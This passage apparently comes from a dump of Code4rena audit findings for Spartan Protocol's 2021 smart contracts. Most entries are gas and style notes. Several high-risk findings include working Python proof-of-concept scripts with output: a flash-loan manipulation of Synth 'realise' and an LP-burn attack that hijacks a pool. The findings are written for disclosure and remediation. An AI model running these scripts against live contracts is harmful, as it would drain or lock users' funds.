transfer_amount = int(amount/10)     base.functions.transfer(token_pool.address, transfer_amount).transact()     token_pool.functions.swapTo(token.address, user).transact() ```  Mint Synth for ten times ```python for i in range(10):     amount = 10 * 10**18     transfer_amount = int(amount/10)     base.functions.transfer(token_pool.address, transfer_amount).transact()     token_pool.functions.mintSynth(token_synth.address, user).transact() ``` The Pool was initialized with 10000:10000 in both cases. While the first case(swap token) gets `4744.4059` and the second case gets `6223.758`.  ## Tools Used None ## Recommended Mitigation Steps The debt should be considered in the AMM pool.  I recommend to maintain a debt variable in the Pool and use `tokenAmount - debt` when the Pool calculates the token price. Here's some idea of it. ```     uint256 public debt;     function _tokenAmount() returns (uint256) {         return tokenAmount - debt;     }      // Swap SPARTA for Synths     function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {         require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, \"!synth\"); // Must be a valid Synth         uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount          // Use tokenAmount - debt to calculate the value         uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, _tokenAmount()); // Calculate value of swapping SPARTA to the relevant underlying TOKEN          // increment the debt         debt += output          uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted         _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount         uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN         fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA         _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold         iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user         _addPoolMetrics(fee); // Add slip fee to the revenue metrics         emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);       return (output, fee);     }  ```   "}, {"title": "Router.sol: Redundant _token initialization in addLiquiditySingleForMember()", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/57", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The lines below of the `addLiquiditySingleForMember()` function  ```jsx address _token = token; if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB ```  are redundant since `_token` is not used subsequently. Note that `_handleTransferIn()` will perform the handling of native BNB transfers.  ### Recommended Mitigation Steps  The mentioned lines above can be removed.  "}, {"title": "Pool.sol + Router.sol: Set revenue directly as _fee", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/56", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  ```jsx // Pool.sol: L344-345 map30DPoolRevenue = 0; map30DPoolRevenue = map30DPoolRevenue+(_fee);  // Router.sol: L317-318 mapAddress_30DayDividends[_pool] = 0; mapAddress_30DayDividends[_pool] = mapAddress_30DayDividends[_pool] + _fees; ```  can simply be written as  ```jsx map30DPoolRevenue = _fee;  mapAddress_30DayDividends[_pool] = _fees; ```  respectively.  "}, {"title": "Pool.sol + Synth.sol: Inconsistent Allowance Checking Implementation", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/55", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The contract performs allowance checks for transfers in 2 ways:  1. Check allowance is greater than requested amount, revert otherwise. Then do allowance decrement. (Eg. in `transferFrom`) 2. Directly do the allowance decrement, will revert for underflow since sol 0.8.3 is used. (Eg. in `burnFrom`  It is best to stick to 1 method for consistency. For gas optimizations, the 2nd method is better, but the first provides more meaningful revert messages to aid debugging.  ### Recommended Mitigation Steps  Commit to either method, not both.  "}, {"title": "isEqual(): Inconsistent Implementation", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/54", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ```jsx function isEqual(bytes memory part1, bytes memory part2) external pure returns(bool equal){   if(sha256(part1) == sha256(part2)){       return true;   } } ```  Both implementations can be simplified and made consistent to be  ```jsx function isEqual(bytes memory part1, bytes memory part2) external pure returns(bool){   return(sha256(part1) == sha256(part2)); } ```  "}, {"title": "DaoVault.sol & BondVault.sol: Discrepancies in mapping visibility", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/53", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  In DaoVault and BondVault, the following mappings are declared private:  - `mapMember_weight` - `mapMemberPool_weight`  The DaoVault has an additional private mapping `mapMemberPool_balance`.  Despite this, the DaoVault has getter methods for all 3 mappings, whilst the BondVault only has a getter method for `mapMember_weight`.  The getter methods (which aren't included in the interface) would be unnecessary if the mappings are declared as public. Also, the BondVault might perhaps be lacking a view method for `mapMemberPool_weight`.   Should the separate getter methods remain unchanged, note that the getter method for `getMemberWeight()` has a convoluted implementation:  ```jsx function getMemberWeight(address member) external view returns (uint256) {  if (mapMember_weight[member] > 0) {   return mapMember_weight[member];   } else {     return 0;     } } ```  which can be simplified to simply returning the `mapMember_weight[member]`.  ### Recommended Mitigation Steps  - Declare the relevant private mappings as public. - Kindly check if `mapMemberPool_weight` should be public for the BondVault as well, since it is the case for the DaoVault.  "}, {"title": "Dao.sol: Return votes > consensus", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/52", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The `hasMajority()`, `hasQuorum()` and `hasMinority()` functions contains the following implementation:  ```jsx if(votes > consensus){  return true; } else {  return false; } ```  This can be reduced to `return (votes > consensus);`  "}, {"title": "BondVault.sol: Optimizations", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/51", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  - `_pool` is fetched once in `claimForMember()`, but is fetched again in its sub function `decreaseWeight()`. Since `decreaseWeight()` is solely called by `claimForMember()`, the `_pool` variable can be passed as an input to `decreaseWeight()` to avoid having to retrieve its value again. - In `increaseWeight()` and `decreaseWeight()`, zeroing out `mapMemberPool_weight` is redundant as it is set to another value 2 lines later.  "}, {"title": "Router.sol: lastMonth variable is private", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/50", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  `uint private lastMonth; // Timestamp of the start of current metric period (For UI)`   There is no getter method for `lastMonth`, which makes the (For UI) comment is erroneous.  ### Recommended Mitigation Steps  Make it `public` or edit the comment  "}, {"title": "Pool.sol: Optimizations", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/49", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  1. `DEPLOYER` is set in the constructor but is not used anywhere in the contract 2. Redundant initialization `lastMonth = 0;` 3. `genesis` and `decimals` can have the `immutable` keywords since they are only set in the constructor and can't be changed 4. `iUTILS(_DAO().UTILS())` is called many times in `mintSynth()`, `removeForMember()` and `_swap*()` functions. Recommend storing as a local variable in these functions. 5. Since `revenueArray` cannot exceed length 2, the `addFee` function can be directly incorporated into the `addRevenue` function. Its for loop can be replaced with direct replacement of values. Also, `revenueArray.length != 2` is cleaner and easier to read compared to `!(revenueArray.length == 2)`. Given its purpose and usage, `archiveRevenue` / `cachePastRevenue` seems to be a better function name. If it is clear that revenueArray will be kept constant at 2, an alternative is to simply store the values as 2 separate variables.  ### Recommended Mitigation Steps  1. Remove `DEPLOYER` 2. Remove the initialization `lastMonth = 0;` 3. `uint public immutable genesis;` and `uint8 public immutable override decimals;` 4. `iUTILS utils = _DAO().UTILS();` should utils be called more than once in a function 5. Possible implementation below  ```jsx function archiveRevenue(uint _totalRev) {  if (revenueArray.length == 2) {   // shift value to the right   revenueArray[1] = revenueArray[0];   revenueArray[0] = _totalRev;   } else {     // populate revenueArray to be of length 2     revenueArray.push(_totalRev);   } } ```  "}, {"title": "Dao.sol: Restrict Function Visibilities", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/48", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  - `calcClaimBondedLP()` returns `_BONDVAULT.calcBondedLP(()` which is a view function. Hence, `calcClaimBondedLP()` can be a view function as well. - `hasMinority()` is not called within the contract. Hence, the `public` keyword can be reduced to `external` to save gas.  ### Recommended Mitigation Steps  - Restrict `calcClaimBondedLP()` visibility to `view` (ie. add `view` keyword). - Reduce `hasMinority()` from `public` to `external`  "}, {"title": "Synth.sol: Redundant _handleTransferIn, onlyDAO, DEPLOYER", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/47", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  `_handleTransferIn()`, `DEPLOYER` and `onlyDAO()` are defined but unused. Hence, they can be removed from the contract.  "}, {"title": "Pool.sol: swapTo() should not be payable", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/46", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The `swapTo()` function should not be payable since the WBNB-SPARTA pool should not receive BNB, but WBNB. The router swap functions handles the wrapping and unwrapping of BNB.  Furthermore, the `swapTo()` will not detect any deposited BNB, so any swapTo() calls that have msg.value > 0 will have their BNB permanently locked in the pool contract.   ### Recommended Mitigation Steps  Remove `payable` keyword in `swapTo()`.  "}, {"title": "Dao.sol: Reserve emissions must be turned on for depositLPs and bonds", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/44", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  `depositLPForMember()` and `bond()` invokes `harvest()` if a user has existing LP deposits or bonded assets into the DAO. This is to prevent users from depositing more assets before calling `harvest()` to earn more DAOVault incentives. However, `harvest()` reverts if reserve emissions are turned off.   Hence, deposits / bonds performed by existing users will fail should reserve emissions be disabled.  ### Recommended Mitigation Steps  Cache claimable rewards into a separate mapping when `depositLPForMember()` and `bond()` are called. `harvest()` will then attempt to claim these cached + pending rewards. Perhaps Synthetix's Staking Rewards contract or Sushiswap's FairLaunch contract can provide some inspiration.  "}, {"title": "Dao.sol: Insufficient validation for proposal creation", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/43", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  In general, creating invalid proposals is easy due to the lack of validation in the `new*Proposal()` functions.  - The `typeStr` is not validated at all. For example, one can call `newActionProposal()` with `typeStr = ROUTER` or `typeStr = BAD_STRING`, both of which will pass. The first will cause `finaliseProposal()` to fail because the proposed address is null, preventing `completeProposal()` from executing. The second does nothing because it does not equate to any of the check `typeStr`, and so `completeProposal()` isn't executed at all. - Not checking the proposed values are null. The checks only happen in `finaliseProposal()` when the relevant sub-functions are called, like the `move*()` functions.  All of these scenarios lead to a mandatory 15 day wait since proposal creation in order to be cancelled, which prevents the creation of new proposals (in order words, denial of service of the DAO).  ### Recommended Mitigation Steps  1. Since the number of proposal types is finite, it is best to restrict and validate the `typeStr` submitted. Specifically,     - `newActionProposal()` should only allow `FLIP_EMISSIONS` and `GET_SPARTA` proposal types     - `newAddressProposal()` should only allow `DAO`, `ROUTER`, `UTILS`, `RESERVE`, `LIST_BOND`, `DELIST_BOND`, `ADD_CURATED_POOL` and  `REMOVE_CURATED_POOL` proposal types     - `newParamProposal()` should only allow `COOL_OFF` and `ERAS_TO_EARN` proposal types 2. Perhaps have a \"catch-all-else\" proposal that will only call `_completeProposal()` in `finaliseProposal()`  ```jsx function finaliseProposal() external {  ...  } else if (isEqual(_type, 'ADD_CURATED_POOL')){   _addCuratedPool(currentProposal);   } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){     _removeCuratedPool(currentProposal);   } else {   completeProposal(_proposalID);  } } ```  3. Do null validation checks in `newAddressProposal()` and `newParamProposal()`  ```jsx function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {     require(proposedAddress != address(0), \"!address\");   // TODO: validate typeStr   ... }  function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {     require(param != 0, \"!param\");   // TODO: validate typeStr   ... } ```  "}, {"title": "BondVault.sol: Possibly unwithdrawable bondedLP funds in claimForMember() + claimRate never zeros after full withdrawals", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/42", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  A host of problems arise from the L110-113 of the `claimForMember()` function, where `_claimable` is deducted from the bondedLP balance before the condition check, when it should be performed after (or the condition is changed to checking if the remaining bondedLP balance to zero).  ```jsx // L110 - L113 mapBondAsset_memberDetails[asset].bondedLP[member] -= _claimable; // Remove the claim amount from the user's remainder if(_claimable == mapBondAsset_memberDetails[asset].bondedLP[member]){  mapBondAsset_memberDetails[asset].claimRate[member] = 0; // If final claim; zero-out their claimRate } ```  **1. Permanently Locked Funds**  If a user claims his bonded LP asset by calling `dao.claimForMember()`, or a malicious attacker helps a user to claim by calling `dao.claimAllForMember()`, either which is done such that `_claimable` is exactly half of his remaining bondedLP funds of an asset, then the other half would be permanently locked.  - Assume `mapBondAsset_memberDetails[asset].bondedLP[member] = 2 * _claimable` - L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = _claimable` - L111: The if condition is satisfied - L112: User's claimRate is erroneously set to 0 \u21d2 `calcBondedLP()` will return 0, ie. funds are locked permanently  **2. Claim Rate Never Zeroes For Final Claim**   On the flip side, should a user perform a claim that enables him to perform a full withdrawal (ie. `_claimable` = `mapBondAsset_memberDetails[asset].bondedLP[member]`, we see the following effects:  - L110: `mapBondAsset_memberDetails[asset].bondedLP[member] = 0` - L111: The if condition is not satisfied, L112 does not execute, so the member's claimRate for the asset remains non-zero (it is expected to have been set to zero).  Thankfully, subsequent behaviour remains as expected since `calcBondedLP` returns zero as `claimAmount` is set to the member's bondedLP balance (which is zero after a full withdrawal).  ### Recommended Mitigation Steps  The `_claimable` deduction should occur after the condition check. Alternatively, change the condition check to `if (mapBondAsset_memberDetails[asset].bondedLP[member] == 0)`.  "}, {"title": "Ambiguous parameter name in `SynthVault`", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/41", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-07-spartan-findings", "body": "Ambiguous parameter name in `SynthVault`"}, {"title": "Synth `realise` is vulnerable to flash loan attacks", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/40", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-spartan-findings", "body": "# Handle  jonah1005   # Vulnerability details  ## Impact Synth `realise` function calculates `baseValueLP` and `baseValueSynth` base on AMM spot price which is vulnerable to flash loan attack. Synth's lp is subject to `realise` whenever the AMM ratio is different than Synth's debt ratio.   The attack is not necessarily required flash loan. Big whale of the lp token holders could keep calling realse by shifting token ratio of AMM pool back and forth.   ## Proof of Concept The vulnerability locates at: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L187-L199  Where the formula here is dangerous: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L114-L126  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L210-L217 Here's a script for conducting flashloan attack ```python flashloan_amount = init_amount user = w3.eth.accounts[0] marked_token.functions.transfer(user, flashloan_amount).transact() marked_token.functions.transfer(token_pool.address, flashloan_amount).transact({'from': user}) token_pool.functions.addForMember(user).transact({'from': user}) received_lp = token_pool.functions.balanceOf(user).call()  synth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call() token_synth.functions.realise(token_pool.address).transact() token_pool.functions.transfer(token_pool.address, received_lp).transact({'from': user}) token_pool.functions.removeForMember(user).transact({'from': user}) token_synth.functions.realise(token_pool.address).transact() synth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call() print('synth_lp_balance_after_realise', synth_balance_after_realise) print('synth_lp_balance_before_realise', synth_balance_before_realise)  ``` Output: ``` synth_balance_after_realise 1317859964829313908162 synth_balance_before_realise 2063953488372093023256 ``` ## Tools Used None  ## Recommended Mitigation Steps Calculating Lp token's value base on AMM protocol is known to be dangerous. There are a few steps that might solve the issue: 1. calculate token's price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle. 2. calculate lp token value based on anti-flashloan formula.  Alpha finance's formula is a good reference: https://blog.alphafinance.io/fair-lp-token-pricing   "}, {"title": "Hijack token pool by burning liquidity token", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/38", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  jonah1005   # Vulnerability details  ## Impact  `Pool` allows users to burn lp tokens without withdrawing the tokens. This allows the hacker to mutate the pools' rate to a point that no one can get any lp token anymore (even if depositing token).  The liquidity tokens are calculated at `Utils:calcLiquidityUnits` ```             // units = ((P (t B + T b))/(2 T B)) * slipAdjustment             // P * (part1 + part2) / (part3) * slipAdjustment             uint slipAdjustment = getSlipAdustment(b, B, t, T);             uint part1 = t*(B);             uint part2 = T*(b);             uint part3 = T*(B)*(2);             uint _units = (P * (part1 + (part2))) / (part3);             return _units * slipAdjustment / one;  // Divide by 10**18 ``` where `P` stands for `totalSupply` of current Pool. If `P` is too small (e.g, 1) then all the units would be rounding to 0.  Since any person can create a `Pool` at `PoolFactory`, hackers can create a Pool and burn his lp and set `totalSupply` to 1. He will be the only person who owns the Pool's lp from now on.  ## Proof of Concept Pool's burn logic: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L146  Utils' lp token formula: https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L80  Here's a script of a user depositing 1M token to a pool where `totalSupply` equals 1  ``` dai_pool.functions.burn(init_amount-1).transact() print('total supply', dai_pool.functions.totalSupply().call()) dai.functions.transfer(dai_pool.address, 1000000 * 10**18).transact() dai_pool.functions.addForMember(user).transact() print('lp received from depositing 1M dai: ', dai_pool.functions.balanceOf(user).call()) ```  Output: ``` total supply 1 lp received from depositing 1M dai:  0 ``` ## Tools Used None ## Recommended Mitigation Steps Remove `burn` or restrict it to privileged users only.   "}, {"title": "Dao.sol: Unbounded Iterations in claimAllForMember()", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/37", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The `claimAllForMember()` function iterates through the full list of `listedAssets`. Should `listedAssets` become too large, as more assets are listed, calling this function will run out of gas and fail.  ### Recommended Mitigation Steps  A good compromise would be to take in an array of asset indexes, so that users can claim for multiple assets in multiple parts.  ```jsx function claimAllForMember(address member, uint256[] calldata assetIndexes)  external returns (bool){         address [] memory listedAssets = listedBondAssets; // Get array of bond assets         for(uint i = 0; i < assetIndexes.length; i++){             uint claimA = calcClaimBondedLP(member, listedAssets[assetIndexes[i]]); // Check user's unlocked Bonded LPs for each asset             if(claimA > 0){                _BONDVAULT.claimForMember(listedAssets[assetIndexes[i]], member); // Claim LPs if any unlocked             }         }         return true;     } ```  "}, {"title": "Router.sol: Optimise calculation of totalTradeFees in addTradeFee()", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/36", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  In the case where `arrayFeeLength < arrayFeeSize`, totalTradeFees is not calculated, so normalAverageFee will be 0. Hence, a return statement can be added to exit the function. Otherwise, when `arrayFeeSize >= arrayFeeLength`, the feeArray elements are iterated through twice:  - First, in `addFee`, to shift the elements by 1 to make way for the new fee. Note that `addFee()` is also solely called by `addTradeFee()` - Second, for the calculation of totalTradeFees  With all these in mind, we can make the second iteration redundant by combining the total trade fee calculation in `addFee()`.  ### Recommended Mitigation Steps  ```jsx function addTradeFee(uint _fee) internal {  uint arrayFeeLength = feeArray.length;   if(arrayFeeLength < arrayFeeSize){   feeArray.push(_fee); // Build array until it is == arrayFeeSize     return;    }   // If array is required length; shift in place of oldest item   // Calculate totalTradeFee at the same time   uint totalTradeFees = addCurrentFeeAndCalcTotalTradeFees(arrayFeeLength, _fee);    normalAverageFee = totalTradeFees / arrayFeeSize; // Calc average fee }  function addCurrentFeeAndCalcTotalTradeFees(   uint arrayFeeLength,  uint _fee ) internal returns (uint totalTradeFees) {  totalTradeFees = _fee; // add newest fee   // store and update in memory first, for gas optimization   uint[] memory _feeArray = feeArray;   for (uint i = arrayFeeLength - 1; i > 0; i--) {   _feeArray[i] = _feeArray[i - 1];     totalTradeFees += _feeArray[i];   }   _feeArray[0] = _fee;   feeArray = _feeArray; } ```  "}, {"title": "Router.sol: Better changeArrayFeeSize implementation", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/35", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  The current `changeArrayFeeSize` implementation deletes the entire feeArray (which is used to calculate normalAverageFee for dividends), resulting in having to rebuild the feeArray again.  It would be better to keep the feeArray as is if the `_size` is greater than the current feeArrayLength, or trim it otherwise, so that the calculation `normalAverageFee` has past trade fees to use and is therefore more accurate.  ### Recommended Mitigation Steps  ```jsx function changeArrayFeeSize(uint _size) external onlyDAO {  arrayFeeSize = _size;   // trim feeArray to match _size   if (_size < feeArray.length) {      uint[] memory tempFeeArray = new uint[](_size);      // copy feeArray for gas optimization      uint[] memory _feeArray = feeArray;    for (uint i = 0; i < _size; i++) {         tempFeeArray[i] = _feeArray[i];    }      feeArray = tempFeeArray;  }   // otherwise, keep feeArray unchanged } ```  "}, {"title": "Utils.sol: Combine Swap Output + Fee Calculation to avoid Rounding Errors + Integer Overflow [Updated]", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/34", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  hickuphh3   # Vulnerability details  ### Impact  For minting, burning of synths and swaps, the fee and output amounts are calculated separately via `calcSwapOutput` and `calcSwapFee`. To avoid rounding errors and duplicate calculations, it would be best to combine both of these functions and return both outputs at once.  For example, if we take `x = 60000, X = 73500, Y = 50321`, the actual swap fee should be `10164.57` and output `12451.6`. However, `calcSwapOutput` and `calcSwapFee` returns `10164` and `12451`, leaving 1 wei unaccounted for. This can be avoided by combining the calculations as suggested below. The fee and actual output will be `10164` and `12452` instead.  Functions that have to call `calcSwapOutput` within the contract (eg. `calcSwapValueInBaseWithPool`) should call this function as well, for calculation consistency.  In addition, calculations for both `calcSwapOutput` and `calcSwapFee` will phantom overflow if the input values become too large. (Eg. `x = 2^128, Y=2^128`). This can be avoided by the suggested implementation below using the FullMath library.  ### Recommended Mitigation Steps  ```jsx function calcSwapFeeAndOutput(uint x, uint X, uint Y) public pure returns (uint output, uint swapFee) {      uint xAddX = x + X;      uint rawOutput = FullMath.mulDiv(x, Y, xAddX);      swapFee = FullMath.mulDiv(rawOutput, x, xAddX);      output = rawOutput - swapFee; }  function calcSwapValueInBaseWithPool(address pool, uint amount) public view returns (uint _output){        uint _baseAmount = iPOOL(pool).baseAmount();        uint _tokenAmount = iPOOL(pool).tokenAmount();        (_output, ) = calcSwapFeeAndOutput(amount, _tokenAmount, _baseAmount); } ```  The FullMath library is included (and made compatible with sol 0.8+) below for convenience.  ```jsx // SPDX-License-Identifier: MIT pragma solidity >= 0.8.0;  /// @title Contains 512-bit math functions /// @notice Facilitates multiplication and division that can have overflow of an intermediate value without any loss of precision /// @dev Handles \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits library FullMath {     /// @notice Calculates floor(a\u00d7b\u00f7denominator) with full precision. Throws if result overflows a uint256 or denominator == 0     /// @param a The multiplicand     /// @param b The multiplier     /// @param denominator The divisor     /// @return result The 256-bit result     /// @dev Credit to Remco Bloemen under MIT license https://xn--2-umb.com/21/muldiv     function mulDiv(         uint256 a,         uint256 b,         uint256 denominator     ) internal pure returns (uint256 result) {         // 512-bit multiply [prod1 prod0] = a * b         // Compute the product mod 2**256 and mod 2**256 - 1         // then use the Chinese Remainder Theorem to reconstruct         // the 512 bit result. The result is stored in two 256         // variables such that product = prod1 * 2**256 + prod0         uint256 prod0; // Least significant 256 bits of the product         uint256 prod1; // Most significant 256 bits of the product         assembly {             let mm := mulmod(a, b, not(0))             prod0 := mul(a, b)             prod1 := sub(sub(mm, prod0), lt(mm, prod0))         }          // Handle non-overflow cases, 256 by 256 division         if (prod1 == 0) {             require(denominator > 0, \"0 denom\");             assembly {                 result := div(prod0, denominator)             }             return result;         }          // Make sure the result is less than 2**256.         // Also prevents denominator == 0         require(denominator > prod1, \"denom <= prod1\");          ///////////////////////////////////////////////         // 512 by 256 division.         ///////////////////////////////////////////////          // Make division exact by subtracting the remainder from [prod1 prod0]         // Compute remainder using mulmod         uint256 remainder;         assembly {             remainder := mulmod(a, b, denominator)         }         // Subtract 256 bit number from 512 bit number         assembly {             prod1 := sub(prod1, gt(remainder, prod0))             prod0 := sub(prod0, remainder)         }          // Factor powers of two out of denominator         // Compute largest power of two divisor of denominator.         // Always >= 1.         uint256 twos = denominator & (~denominator + 1);         // Divide denominator by power of two         assembly {             denominator := div(denominator, twos)         }          // Divide [prod1 prod0] by the factors of two         assembly {             prod0 := div(prod0, twos)         }         // Shift in bits from prod1 into prod0. For this we need         // to flip `twos` such that it is 2**256 / twos.         // If twos is zero, then it becomes one         assembly {             twos := add(div(sub(0, twos), twos), 1)         }         unchecked {             prod0 |= prod1 * twos;                          // Invert denominator mod 2**256             // Now that denominator is an odd number, it has an inverse             // modulo 2**256 such that denominator * inv = 1 mod 2**256.             // Compute the inverse by starting with a seed that is correct             // correct for four bits. That is, denominator * inv = 1 mod 2**4             uint256 inv = (3 * denominator) ^ 2;                          // Now use Newton-Raphson iteration to improve the precision.             // Thanks to Hensel's lifting lemma, this also works in modular             // arithmetic, doubling the correct bits in each step.             inv *= 2 - denominator * inv; // inverse mod 2**8             inv *= 2 - denominator * inv; // inverse mod 2**16             inv *= 2 - denominator * inv; // inverse mod 2**32             inv *= 2 - denominator * inv; // inverse mod 2**64             inv *= 2 - denominator * inv; // inverse mod 2**128             inv *= 2 - denominator * inv; // inverse mod 2**256                          // Because the division is now exact we can divide by multiplying             // with the modular inverse of denominator. This will give us the             // correct result modulo 2**256. Since the precoditions guarantee             // that the outcome is less than 2**256, this is the final result.             // We don't need to compute the high bits of the result and prod1             // is no longer required.             result = prod0 * inv;         }         return result;     } } ```  "}, {"title": "`approveAndCall` approve `max` amount of token", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/33", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "disagree with severity"], "target": "2021-07-spartan-findings", "body": "# Handle  jonah1005   # Vulnerability details  ## Impact `approveAndCall` approve max allowance to the receiver regardless of the given parameter.  This is far away from what the function name implies. Users would lose all the tokens by using this function.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L118 https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L113 ## Tools Used None ## Recommended Mitigation Steps Change to `_approve(msg.sender, recipient, amount); `  "}, {"title": "Misleading comment and missing revert message", "html_url": "https://github.com/code-423n4/2021-07-spartan-findings/issues/31", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-07-spartan-findings", "body": "# Handle  jonah1005   # Vulnerability details  ## Impact https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L46  The comment at `poolFactory` L46  is a bit misleading. ``` require(getPool(token) == address(0)); // Must be a valid token ```  A similar checks in `synthFactory` seems to be more clear. https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthFactory.sol#L38  ```         require(getSynth(token) == address(0), \"exists\"); // Synth must not already exist ```  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L46 ## Tools Used None ## Recommended Mitigation Steps  It seems that `PoolFactory` is the only contract that does not provide detailed revert messages. I wonder whether the devs do this because of the concern about the code size limit. If that's the case, I recommend refactoring it to 